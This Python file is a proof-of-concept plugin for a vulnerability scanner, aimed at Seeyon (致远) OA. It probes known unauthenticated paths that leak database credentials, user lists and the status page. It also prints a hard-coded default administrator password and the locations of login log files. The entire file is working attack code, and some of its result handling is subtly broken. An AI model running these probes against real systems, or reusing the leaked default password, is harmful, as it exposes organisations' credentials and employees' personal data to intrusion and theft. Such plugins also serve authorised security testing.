import pocs
from lib import config
import re
import requests
import urllib3
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

# 定义类 名称不可改变，且需要继承父类Pocs
class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='致远oa敏感信息泄漏漏洞'
        self.vul_name='致远oa敏感信息泄漏漏洞'
        self.vul_num=''
        self.app_name='致远oa'
        self.app_version=''
        self.author='haochen'
        self.msg='致远oa多处敏感文件泄漏漏洞'
        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        # 自由发挥
        att_msg={}
        # 将攻击的目标和poc名称导入
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        self.must_parameter = must_parameter
        att_msg['status']='failed'
        att_msg['msg']=''
        if re.search('/$',url):
            url=url[0:len(url)-1]
        msg1 = self.cerateMysql(url)
        if msg1 != False:
            att_msg['status'] = 'success'
            att_msg['msg'] += msg1
        msg2 = self.DownExcelBeanServlet(url)
        if msg2 != False:
            att_msg['status'] = 'success'
            att_msg['msg'] += msg2
        msg3 = self.initDataAssess(url)
        if msg3 != False:
            att_msg['status'] = 'success'
            att_msg['msg'] += msg3
        msg4 = self.status(url)
        if msg4 != False:
            att_msg['status'] = 'success'
            att_msg['msg'] += msg4
        if att_msg['msg'] == '':
            att_msg['status']='failed'
            att_msg['msg']='不存在漏洞'
        return att_msg

    def get(self,url,path):
        url=url+path
        try:
            r=requests.get(url=url,timeout=3,verify=False)
            return r
        except Exception as e:
            pass

    def cerateMysql(self,url):
        name='createMysql.jsp 数据库敏感信息泄'
        path='/yyoa/createMysql.jsp'
        path2='/yyoa/ext/createMysql.jsp'
        r=self.get(url,path)
        if r:
            if r.status_code==200 and 'root' in r.text:
                msg = name+'Payload：'+url+path+'\n'
                return msg
        r=self.get(url,path2)
        if r:
            if r.status_code==200 and 'root' in r.text:
                msg = name,'Payload：'+url+path+'\n'
                return msg
        else:
            return False

    def DownExcelBeanServlet(self,url):
        name='DownExcelBeanServlet 用户敏感信息泄露'
        path='/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0'
        r=self.get(url,path)
        if r:
            if r.status_code==200 and 'xls' in str(r.headers).lower():
                msg = name+'Payload：'+url+path
                return msg
            else:
                return False
        else:
            return False

    def initDataAssess(self,url):
        name='initDataAssess.jsp 用户敏感信息泄露'
        path='/yyoa/assess/js/initDataAssess.jsp'
        r=self.get(url,path)
        if r:
            if r.status_code==200 and 'personList' in r.text:
                msg = name+'Payload：'+url+path
                return msg
            else:
                return False
        else:
            return False

    def status(self,url):
        name='A8 状态监控页面信息泄露'
        path='/seeyon/management/status.jsp'
        r=self.get(url,path)
        if r:
            if r.status_code==200 and 'Password' in r.text:
                msg = name,url+path,'默认密码：WLCCYBD@SEEYON'+'	敏感路径:/seeyon/logs/login.log	/seeyon/logs/v3x.log'	
                return msg	
            else:
                return False
        else:
            return False